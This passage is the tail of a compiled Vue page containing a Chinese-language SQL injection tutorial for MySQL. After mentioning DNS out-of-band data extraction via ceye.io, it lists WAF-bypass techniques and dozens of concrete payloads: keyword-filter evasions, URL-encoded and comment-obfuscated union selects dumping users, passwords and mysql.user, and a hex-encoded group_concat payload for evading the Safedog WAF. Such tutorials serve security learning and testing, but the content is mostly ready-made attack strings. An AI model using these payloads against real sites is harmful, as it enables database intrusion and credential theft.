</code></pre></div><p>相应的更换<code>select database()</code>查询语句便可以实现 DNS 外带的回显注入，其中 27epx0.ceye.io 为 ceye.io 平台给每个账号起的昵称。</p><h2 id="绕过语句" tabindex="-1"><a class="header-anchor" href="#绕过语句" aria-hidden="true">#</a> 绕过语句</h2><ul><li>大小写。</li><li>双写关键字。</li><li>URL 编码。</li><li>内联注释。</li><li>等价函数替换。</li><li>分块传输。</li><li>遇到云 WAF，寻找真实 IP。</li><li><code>%0a</code>。</li><li><code>between a and b</code>。</li><li>缓冲区溢出。</li></ul><div class="language-sql" data-ext="sql"><pre class="language-sql"><code><span class="token punctuation">(</span><span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> users <span class="token keyword">where</span> id<span class="token operator">=</span><span class="token number">1</span>  <span class="token operator">and</span> <span class="token punctuation">(</span><span class="token keyword">select</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">=</span><span class="token punctuation">(</span><span class="token keyword">Select</span> <span class="token number">0xA</span>\\<span class="token operator">*</span><span class="token number">1000</span><span class="token punctuation">)</span> <span class="token keyword">uNiOn</span> <span class="token keyword">SeLeCt</span> <span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span>version<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">)</span>
</code></pre></div><ul><li>HEX编码</li></ul><div class="language-sql" data-ext="sql"><pre class="language-sql"><code>unhex<span class="token punctuation">(</span>hex<span class="token punctuation">(</span>schema_name<span class="token punctuation">)</span><span class="token punctuation">)</span>
</code></pre></div><ul><li>关键词过滤</li></ul><div class="language-sql" data-ext="sql"><pre class="language-sql"><code>过滤关键词: <span class="token operator">and</span><span class="token punctuation">,</span> <span class="token operator">or</span><span class="token punctuation">,</span> <span class="token keyword">union</span>
可能正则: preg_match<span class="token punctuation">(</span><span class="token string">&#39;/(and|or|union)/i&#39;</span><span class="token punctuation">,</span> $id<span class="token punctuation">)</span>
被拦截的语句: <span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token keyword">user</span><span class="token punctuation">,</span> password <span class="token keyword">from</span> users
bypass语句: <span class="token number">1</span> <span class="token operator">||</span> <span class="token punctuation">(</span><span class="token keyword">select</span> <span class="token keyword">user</span> <span class="token keyword">from</span> users <span class="token keyword">where</span> user_id <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token string">&#39;admin&#39;</span>

过滤关键词: <span class="token operator">and</span><span class="token punctuation">,</span> <span class="token operator">or</span><span class="token punctuation">,</span> <span class="token keyword">union</span><span class="token punctuation">,</span> <span class="token keyword">where</span>
被拦截的语句: <span class="token number">1</span> <span class="token operator">||</span> <span class="token punctuation">(</span><span class="token keyword">select</span> <span class="token keyword">user</span> <span class="token keyword">from</span> users <span class="token keyword">where</span> user_id <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token string">&#39;admin&#39;</span>
bypass语句: <span class="token number">1</span> <span class="token operator">||</span> <span class="token punctuation">(</span><span class="token keyword">select</span> <span class="token keyword">user</span> <span class="token keyword">from</span> users <span class="token keyword">limit</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token string">&#39;admin&#39;</span>

过滤关键词: <span class="token operator">and</span><span class="token punctuation">,</span> <span class="token operator">or</span><span class="token punctuation">,</span> <span class="token keyword">union</span><span class="token punctuation">,</span> <span class="token keyword">where</span><span class="token punctuation">,</span> <span class="token keyword">limit</span>
被拦截的语句: <span class="token number">1</span> <span class="token operator">||</span> <span class="token punctuation">(</span><span class="token keyword">select</span> <span class="token keyword">user</span> <span class="token keyword">from</span> users <span class="token keyword">limit</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token string">&#39;admin&#39;</span>
bypass语句: <span class="token number">1</span> <span class="token operator">||</span> <span class="token punctuation">(</span><span class="token keyword">select</span> <span class="token keyword">user</span> <span class="token keyword">from</span> users <span class="token keyword">group</span> <span class="token keyword">by</span> user_id <span class="token keyword">having</span> user_id <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token string">&#39;admin&#39;</span>

过滤关键词: <span class="token operator">and</span><span class="token punctuation">,</span> <span class="token operator">or</span><span class="token punctuation">,</span> <span class="token keyword">union</span><span class="token punctuation">,</span> <span class="token keyword">where</span><span class="token punctuation">,</span> <span class="token keyword">limit</span><span class="token punctuation">,</span> <span class="token keyword">group</span> <span class="token keyword">by</span>
被拦截的语句: <span class="token number">1</span> <span class="token operator">||</span> <span class="token punctuation">(</span><span class="token keyword">select</span> <span class="token keyword">user</span> <span class="token keyword">from</span> users <span class="token keyword">group</span> <span class="token keyword">by</span> user_id <span class="token keyword">having</span> user_id <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token string">&#39;admin&#39;</span>
bypass语句: <span class="token number">1</span> <span class="token operator">||</span> <span class="token punctuation">(</span><span class="token keyword">select</span> substr<span class="token punctuation">(</span>group_concat<span class="token punctuation">(</span>user_id<span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token keyword">user</span> <span class="token keyword">from</span> users <span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token number">1</span>

过滤关键词: <span class="token operator">and</span><span class="token punctuation">,</span> <span class="token operator">or</span><span class="token punctuation">,</span> <span class="token keyword">union</span><span class="token punctuation">,</span> <span class="token keyword">where</span><span class="token punctuation">,</span> <span class="token keyword">limit</span><span class="token punctuation">,</span> <span class="token keyword">group</span> <span class="token keyword">by</span><span class="token punctuation">,</span> <span class="token keyword">select</span>
被拦截的语句: <span class="token number">1</span> <span class="token operator">||</span> <span class="token punctuation">(</span><span class="token keyword">select</span> substr<span class="token punctuation">(</span>gruop_concat<span class="token punctuation">(</span>user_id<span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token keyword">user</span> <span class="token keyword">from</span> users<span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token number">1</span>
bypass语句: <span class="token number">1</span> <span class="token operator">||</span> <span class="token number">1</span> <span class="token operator">=</span> <span class="token number">1</span> <span class="token keyword">into</span> <span class="token keyword">outfile</span> <span class="token string">&#39;result.txt&#39;</span>
bypass语句: <span class="token number">1</span> <span class="token operator">||</span> substr<span class="token punctuation">(</span><span class="token keyword">user</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token string">&#39;a&#39;</span>

过滤关键词: <span class="token operator">and</span><span class="token punctuation">,</span> <span class="token operator">or</span><span class="token punctuation">,</span> <span class="token keyword">union</span><span class="token punctuation">,</span> <span class="token keyword">where</span><span class="token punctuation">,</span> <span class="token keyword">limit</span><span class="token punctuation">,</span> <span class="token keyword">group</span> <span class="token keyword">by</span><span class="token punctuation">,</span> <span class="token keyword">select</span><span class="token punctuation">,</span> 单引号
被拦截的语句: <span class="token number">1</span> <span class="token operator">||</span> <span class="token punctuation">(</span><span class="token keyword">select</span> substr<span class="token punctuation">(</span>gruop_concat<span class="token punctuation">(</span>user_id<span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token keyword">user</span> <span class="token keyword">from</span> users<span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token number">1</span>
bypass语句: <span class="token number">1</span> <span class="token operator">||</span> user_id <span class="token operator">is</span> <span class="token operator">not</span> <span class="token boolean">null</span>
bypass语句: <span class="token number">1</span> <span class="token operator">||</span> substr<span class="token punctuation">(</span><span class="token keyword">user</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token number">0x61</span>
bypass语句: <span class="token number">1</span> <span class="token operator">||</span> substr<span class="token punctuation">(</span><span class="token keyword">user</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">=</span> unhex<span class="token punctuation">(</span><span class="token number">61</span><span class="token punctuation">)</span>

过滤关键词: <span class="token operator">and</span><span class="token punctuation">,</span> <span class="token operator">or</span><span class="token punctuation">,</span> <span class="token keyword">union</span><span class="token punctuation">,</span> <span class="token keyword">where</span><span class="token punctuation">,</span> <span class="token keyword">limit</span><span class="token punctuation">,</span> <span class="token keyword">group</span> <span class="token keyword">by</span><span class="token punctuation">,</span> <span class="token keyword">select</span><span class="token punctuation">,</span> 单引号<span class="token punctuation">,</span> hex
被拦截的语句: <span class="token number">1</span> <span class="token operator">||</span> substr<span class="token punctuation">(</span><span class="token keyword">user</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">=</span> unhex<span class="token punctuation">(</span><span class="token number">61</span><span class="token punctuation">)</span>
bypass语句: <span class="token number">1</span> <span class="token operator">||</span> substr<span class="token punctuation">(</span><span class="token keyword">user</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">=</span> lower<span class="token punctuation">(</span>conv<span class="token punctuation">(</span><span class="token number">11</span><span class="token punctuation">,</span><span class="token number">10</span><span class="token punctuation">,</span><span class="token number">36</span><span class="token punctuation">)</span><span class="token punctuation">)</span>

过滤关键词: <span class="token operator">and</span><span class="token punctuation">,</span> <span class="token operator">or</span><span class="token punctuation">,</span> <span class="token keyword">union</span><span class="token punctuation">,</span> <span class="token keyword">where</span><span class="token punctuation">,</span> <span class="token keyword">limit</span><span class="token punctuation">,</span> <span class="token keyword">group</span> <span class="token keyword">by</span><span class="token punctuation">,</span> <span class="token keyword">select</span><span class="token punctuation">,</span> 单引号<span class="token punctuation">,</span> hex<span class="token punctuation">,</span> substr
被拦截的语句: <span class="token number">1</span> <span class="token operator">||</span> substr<span class="token punctuation">(</span><span class="token keyword">user</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">=</span> lower<span class="token punctuation">(</span>conv<span class="token punctuation">(</span><span class="token number">11</span><span class="token punctuation">,</span><span class="token number">10</span><span class="token punctuation">,</span><span class="token number">36</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
bypass语句: <span class="token number">1</span> <span class="token operator">||</span> lpad<span class="token punctuation">(</span><span class="token keyword">user</span><span class="token punctuation">,</span><span class="token number">7</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span>

过滤关键词: <span class="token operator">and</span><span class="token punctuation">,</span> <span class="token operator">or</span><span class="token punctuation">,</span> <span class="token keyword">union</span><span class="token punctuation">,</span> <span class="token keyword">where</span><span class="token punctuation">,</span> <span class="token keyword">limit</span><span class="token punctuation">,</span> <span class="token keyword">group</span> <span class="token keyword">by</span><span class="token punctuation">,</span> <span class="token keyword">select</span><span class="token punctuation">,</span> 单引号<span class="token punctuation">,</span> hex<span class="token punctuation">,</span> substr<span class="token punctuation">,</span> white space
被拦截的语句: <span class="token number">1</span> <span class="token operator">||</span> lpad<span class="token punctuation">(</span><span class="token keyword">user</span><span class="token punctuation">,</span><span class="token number">7</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span>
bypass语句: <span class="token number">1</span><span class="token operator">%</span><span class="token number">0</span>b<span class="token operator">||</span><span class="token operator">%</span><span class="token number">0</span>blpad<span class="token punctuation">(</span><span class="token keyword">user</span><span class="token punctuation">,</span><span class="token number">7</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span>

大小写：
标准: <span class="token keyword">SELECT</span> <span class="token operator">*</span> <span class="token keyword">FROM</span> all_tables <span class="token keyword">WHERE</span> OWNER <span class="token operator">=</span> <span class="token string">&#39;DATABASE_NAME&#39;</span>
Bypassed: <span class="token keyword">sELecT</span> <span class="token operator">*</span> <span class="token keyword">FrOm</span> all_tables <span class="token keyword">whERe</span> OWNER <span class="token operator">=</span> <span class="token string">&#39;DATABASE_NAME&#39;</span>

URL编码：
被阻断语句: <span class="token keyword">uNIoN</span><span class="token punctuation">(</span><span class="token keyword">sEleCT</span> <span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">5</span><span class="token punctuation">,</span><span class="token number">6</span><span class="token punctuation">,</span><span class="token number">7</span><span class="token punctuation">,</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token number">9</span><span class="token punctuation">,</span><span class="token number">10</span><span class="token punctuation">,</span><span class="token number">11</span><span class="token punctuation">,</span><span class="token number">12</span><span class="token punctuation">)</span>
Bypassed: <span class="token keyword">uNIoN</span><span class="token operator">%</span><span class="token number">28</span>sEleCT<span class="token operator">+</span><span class="token number">1</span><span class="token operator">%</span><span class="token number">2</span>C2<span class="token operator">%</span><span class="token number">2</span>C3<span class="token operator">%</span><span class="token number">2</span>C4<span class="token operator">%</span><span class="token number">2</span>C5<span class="token operator">%</span><span class="token number">2</span>C6<span class="token operator">%</span><span class="token number">2</span>C7<span class="token operator">%</span><span class="token number">2</span>C8<span class="token operator">%</span><span class="token number">2</span>C9<span class="token operator">%</span><span class="token number">2</span>C10<span class="token operator">%</span><span class="token number">2</span>C11<span class="token operator">%</span><span class="token number">2</span>C12<span class="token operator">%</span><span class="token number">29</span>

一些绕过语句：
<span class="token number">0</span><span class="token operator">+</span><span class="token operator">div</span><span class="token operator">+</span><span class="token number">1</span><span class="token operator">+</span><span class="token keyword">union</span><span class="token operator">%</span><span class="token number">23</span>foo<span class="token operator">*</span><span class="token operator">%</span><span class="token number">2</span>F<span class="token operator">*</span>bar<span class="token operator">%</span><span class="token number">0</span>D<span class="token operator">%</span><span class="token number">0</span>Aselect<span class="token operator">%</span><span class="token number">23</span>foo<span class="token operator">%</span><span class="token number">0</span>D<span class="token operator">%</span><span class="token number">0</span>A1<span class="token operator">%</span><span class="token number">2</span>C2<span class="token operator">%</span><span class="token number">2</span>Ccurrent_user
<span class="token number">1</span> <span class="token operator">AND</span> <span class="token punctuation">(</span><span class="token keyword">select</span> DCount<span class="token punctuation">(</span><span class="token function">last</span><span class="token punctuation">(</span>username<span class="token punctuation">)</span><span class="token operator">&amp;</span><span class="token keyword">after</span><span class="token operator">=</span><span class="token number">1</span><span class="token operator">&amp;</span><span class="token keyword">after</span><span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token keyword">from</span> users <span class="token keyword">where</span> username<span class="token operator">=</span><span class="token string">&#39;ad1min&#39;</span><span class="token punctuation">)</span>
<span class="token number">1</span>&#39;<span class="token keyword">UNION</span><span class="token comment">/*!0SELECT user,2,3,4,5,6,7,8,9/*!0from/*!0mysql.user/*-
amUserId=1 union select username,password,3,4 from users
%0Aselect%200x00,%200x41%20like/*!31337table_name*/</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token operator">%</span><span class="token number">20</span>from<span class="token operator">%</span><span class="token number">20</span>information_schema<span class="token punctuation">.</span><span class="token keyword">tables</span><span class="token operator">%</span><span class="token number">20</span>limit<span class="token operator">%</span><span class="token number">201</span>
<span class="token number">1</span><span class="token operator">%</span><span class="token number">0</span>bAND<span class="token punctuation">(</span><span class="token keyword">SELECT</span><span class="token operator">%</span><span class="token number">0</span>b1<span class="token operator">%</span><span class="token number">20</span>FROM<span class="token operator">%</span><span class="token number">20</span>mysql<span class="token punctuation">.</span>x<span class="token punctuation">)</span>
<span class="token operator">%</span><span class="token number">40</span><span class="token operator">%</span><span class="token number">40</span>new<span class="token operator">%</span><span class="token number">20</span>union<span class="token operator">%</span><span class="token number">23</span>sqlmapsqlmap<span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token operator">%</span><span class="token number">0</span>Aselect<span class="token operator">%</span><span class="token number">201</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token keyword">database</span><span class="token operator">%</span><span class="token number">23</span>sqlmap<span class="token operator">%</span><span class="token number">0</span>A<span class="token operator">%</span><span class="token number">28</span><span class="token operator">%</span><span class="token number">29</span>
<span class="token operator">%</span><span class="token number">0</span>Aselect<span class="token operator">%</span><span class="token number">200</span>x00<span class="token operator">%</span><span class="token number">2</span>C<span class="token operator">%</span><span class="token number">200</span>x41<span class="token operator">%</span><span class="token number">20</span><span class="token operator">not</span><span class="token operator">%</span><span class="token number">20</span><span class="token operator">like</span><span class="token operator">%</span><span class="token number">2</span>F<span class="token operator">*</span><span class="token operator">%</span><span class="token number">2100000</span>table_name<span class="token operator">*</span><span class="token operator">%</span><span class="token number">2</span>F<span class="token operator">%</span><span class="token number">2</span>C3<span class="token operator">%</span><span class="token number">20</span>from<span class="token operator">%</span><span class="token number">20</span>information_schema<span class="token punctuation">.</span><span class="token keyword">tables</span><span class="token operator">%</span><span class="token number">20</span>limit<span class="token operator">%</span><span class="token number">201</span>
</code></pre></div><ul><li>绕过安全狗</li></ul><div class="language-sql" data-ext="sql"><pre class="language-sql"><code>group_concat<span class="token punctuation">(</span><span class="token number">0x3C68343E42797061737320736563757269747920646F672073716C5F696E6A6563743C68343E</span><span class="token punctuation">,</span><span class="token number">0x3C68723E</span><span class="token punctuation">,</span><span class="token number">0x4D7953514C20506F72743A20202020</span><span class="token punctuation">,</span>@<span class="token variable">@port</span><span class="token punctuation">,</span><span class="token number">0x3C68723E</span><span class="token punctuation">,</span><span class="token number">0x4D7953514C2076657273696F6E3A</span><span class="token punctuation">,</span>@<span class="token variable">@version</span><span class="token punctuation">,</span><span class="token number">0x3C68723E</span><span class="token punctuation">,</span><span class="token number">0x4D7953514C5F696E7374616C6C5F706174683A2020</span><span class="token punctuation">,</span>@<span class="token variable">@basedir</span><span class="token punctuation">,</span><span class="token number">0x3C68723E</span><span class="token punctuation">,</span><span class="token number">0x4D7953514C5F64617461626173655F706174683A20202020</span><span class="token punctuation">,</span>@<span class="token variable">@datadir</span><span class="token punctuation">,</span><span class="token number">0x3C68723E</span><span class="token punctuation">,</span><span class="token number">0x43757272656E7420646174616261736520757365723A20202020</span><span class="token punctuation">,</span><span class="token keyword">current_user</span><span class="token punctuation">,</span><span class="token number">0x3C68723E</span><span class="token punctuation">,</span><span class="token number">0x73797374656D2076657273696F6E3A20202020</span><span class="token punctuation">,</span>@<span class="token variable">@version_compile_os</span><span class="token punctuation">,</span><span class="token number">0x3C68723E</span><span class="token punctuation">,</span><span class="token number">0x686F73746E616D653A20202020</span><span class="token punctuation">,</span>@<span class="token variable">@hostname</span><span class="token punctuation">,</span><span class="token number">0x3C68723E</span><span class="token punctuation">,</span><span class="token number">0x43757272656E742064617461626173653A20202020</span><span class="token punctuation">,</span><span class="token keyword">database</span><span class="token comment">/*!()*/</span><span class="token punctuation">,</span><span class="token number">0x3C68723E</span><span class="token punctuation">,</span><span class="token number">0x5573657220496E666F3A20202020</span><span class="token punctuation">,</span><span class="token keyword">user</span><span class="token comment">/*!()*/</span><span class="token punctuation">)</span>
</code></pre></div>`,94);function b(y,g){const p=e("ExternalLinkIcon");return o(),c("div",null,[u,s("p",null,[s("a",r,[n("https://dev.mysql.com/downloads/mysql/"),l(p)])]),i,d,m])}const h=t(k,[["render",b],["__file","MySQL.html.vue"]]);export{h as default};
